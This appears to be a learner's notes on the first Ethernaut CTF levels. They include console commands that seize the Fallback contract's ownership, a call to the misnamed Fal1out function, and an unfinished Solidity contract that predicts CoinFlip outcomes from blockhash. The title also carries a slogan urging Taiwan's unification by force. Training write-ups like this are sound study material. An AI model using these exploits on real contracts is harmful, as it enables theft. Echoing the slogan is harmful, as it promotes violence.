

---

# {LINLIN}

1. Unify Taiwan by force through web3！
2. I'm not sure, but I'm confident

## Notes

I was very happy. I studied all afternoon and gained a lot of knowledge and some basic logical thinking skills. However, I discovered a more serious problem. I am not the material.

### 2024.8.29

I learned the first 4 mini games of this：Ethernaut CTF （31） https://ethernaut.openzeppelin.com/


The first 3 are very simple，But after that, I basically had a hard time

It's like I first learned 1+1=2, and then the next question asked me to calculate calculus directly.

This makes me very frustrated

So，
Review what you learned today：
first question：
I learned that metamask is a wallet embedded into the browser. Once the website you are browsing supports web3, metamask will pop up asking you whether to connect to the website. When there is a transaction, it will also pop up to ask whether to confirm the release of the transaction.

two
Analyzing the code, we can see that there are two ways to make yourself the owner. 1. Call contribute() to transfer more than 1000 ETH to the contract. 2. Call the anonymous callback function to make yourself the owner. Of course the first method is not possible, so you need to try calling the callback function.
The callback function is a method that can and can only have one nameless method in a contract. It cannot have parameters or return values. There are two ways to execute the callback function: 1. Call an unmatched function in the contract, 2. Send a pure transfer transaction without any information to the contract.
await contract.sendTransaction({value:1}) or use metamask to transfer money directly to the contract address, so that you can initiate the rollback function and change the contract owner to us

three
After checking the code, there are no exploitable vulnerabilities. When checking the constructor, it is found that the function name of the constructor is different from the contract name, Fal1out/Fallout. This results in the Fal1out function being actually not a constructor but an ordinary function. At the same time, because the function is public, anyone can call the function.
Interact with the contract directly in the console and call the Fal1out function.

four

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "CoinFlip.sol";

contract attack {
    CoinFlip public conflip; 
    address public owner=0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;
    // 初始化Bank合约地址
    //constructor(CoinFlip _conflip) {
    //    conflip = _conflip;

    //}

    function setadd(CoinFlip _conflip) public{
        conflip = _conflip;
    }
    
      modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function.");
        _;
    }


    uint256 public consecutiveWins=0;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function exp() public onlyOwner{
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        conflip.flip(side);
    }



contract.contribute({value: 1})
contract.sendTransaction({value: 1})
contract.withdraw() 




<!-- Content_END -->
